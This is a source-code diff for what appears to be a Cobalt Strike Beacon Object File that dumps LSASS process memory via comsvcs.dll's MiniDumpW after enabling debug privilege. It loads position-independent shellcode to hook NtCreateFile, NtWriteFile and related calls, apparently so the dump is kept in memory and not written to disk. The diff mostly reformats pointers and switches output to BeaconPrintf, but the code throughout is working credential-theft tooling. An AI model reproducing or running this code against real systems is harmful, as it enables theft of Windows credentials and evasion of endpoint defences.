@@ -4,7 +4,7 @@
 #include "beacon.h"
 #include "bofdefs.h"
 
-struct FileInfo* pFileInfo = NULL;
+struct FileInfo *pFileInfo = NULL;
 
 #include "InstallHooks.c"
 #include "MemClean.c"
@@ -13,12 +13,12 @@ struct FileInfo* pFileInfo = NULL;
 #define TARGET_PROCESS "lsass.exe"
 #define FAKE_DUMP_PATH "C:\\Temp\\redteam\\hello.dmp"
 
-typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
+typedef HRESULT(WINAPI *_MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
 
-typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable,
+typedef NTSTATUS(WINAPI *_RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable,
                                               BOOL CurrentThread,
                                               PULONG Enabled);
-BOOL EnumProcess(IN char* pProcessName, OUT DWORD* pdwProcessId) {
+BOOL EnumProcess(IN char *pProcessName, OUT DWORD *pdwProcessId) {
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
@@ -41,7 +41,7 @@ BOOL EnumProcess(IN char* pProcessName, OUT DWORD* pdwProcessId) {
 }
 
 BOOL ComsvcsDump() {
-    char* DumpPath = FAKE_DUMP_PATH;
+    char *DumpPath = FAKE_DUMP_PATH;
     int dwDumpPath = 0x00;
     WCHAR wCommandLine[MAX_PATH] = {0};
     WCHAR wDumpPath[MAX_PATH] = {0};
@@ -51,11 +51,11 @@ BOOL ComsvcsDump() {
     _MiniDumpW MiniDumpW;
     _RtlAdjustPrivilege RtlAdjustPrivilege;
     /* Start Dump lsass via comsvcs */
-    internal_printf("[+] DumpPath: %s\n", DumpPath);
-    internal_printf("[*] Start Enum Process\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump via Memfiles\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Start Enum Process\n");
 
     if (!EnumProcess(TARGET_PROCESS, &Pid)) return FALSE;
-    internal_printf("[+] Target PID: %d\n", Pid);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target PID: %d\n", Pid);
 
     swprintf_s(wDumpPath, MAX_PATH, L"%hs", DumpPath);
     swprintf_s(wCommandLine, MAX_PATH, L"%d %ls full", Pid, wDumpPath);
@@ -70,7 +70,7 @@ BOOL ComsvcsDump() {
     RtlAdjustPrivilege(20, TRUE, FALSE, &t);
 
     MiniDumpW(0, 0, wCommandLine);
-    internal_printf("[+] Done!\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done!\n");
 
     memset(wDumpPath, 0, MAX_PATH);
     memset(wCommandLine, 0, MAX_PATH);
@@ -94,20 +94,20 @@ void go(IN PCHAR args, IN ULONG argc) {
 
     BeaconDataParse(&parser, args, argc);
 
-    char* ntcreatefilebytes =
+    char *ntcreatefilebytes =
         BeaconDataExtract(&parser, &pFileInfo->PICNtCreateFileLen);
-    char* ntwritefilebytes =
+    char *ntwritefilebytes =
         BeaconDataExtract(&parser, &pFileInfo->PICNtWriteFileLen);
-    char* ntclosebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtCloseLen);
-    char* ntqueryvolumeinformationfilebytes = BeaconDataExtract(
+    char *ntclosebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtCloseLen);
+    char *ntqueryvolumeinformationfilebytes = BeaconDataExtract(
         &parser, &pFileInfo->PICNtQueryVolumeInformationFileLen);
-    char* ntqueryinformationfilebytes =
+    char *ntqueryinformationfilebytes =
         BeaconDataExtract(&parser, &pFileInfo->PICNtQueryInformationFileLen);
-    char* ntsetinformationfilebytes =
+    char *ntsetinformationfilebytes =
         BeaconDataExtract(&parser, &pFileInfo->PICNtSetInformationFileLen);
-    char* ntreadfilebytes =
+    char *ntreadfilebytes =
         BeaconDataExtract(&parser, &pFileInfo->PICNtReadFileLen);
-    char* ntopenfilebytes =
+    char *ntopenfilebytes =
         BeaconDataExtract(&parser, &pFileInfo->PICNtOpenFileLen);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Successful get all PIC shellcode\n");
 
@@ -192,7 +192,7 @@ void go(IN PCHAR args, IN ULONG argc) {
                     WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
                                         NULL, 0, NULL, NULL);
 
-                char* filename = calloc(required_size + 1, sizeof(char));
+                char *filename = calloc(required_size + 1, sizeof(char));
 
                 WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
                                     filename, required_size, NULL, NULL);
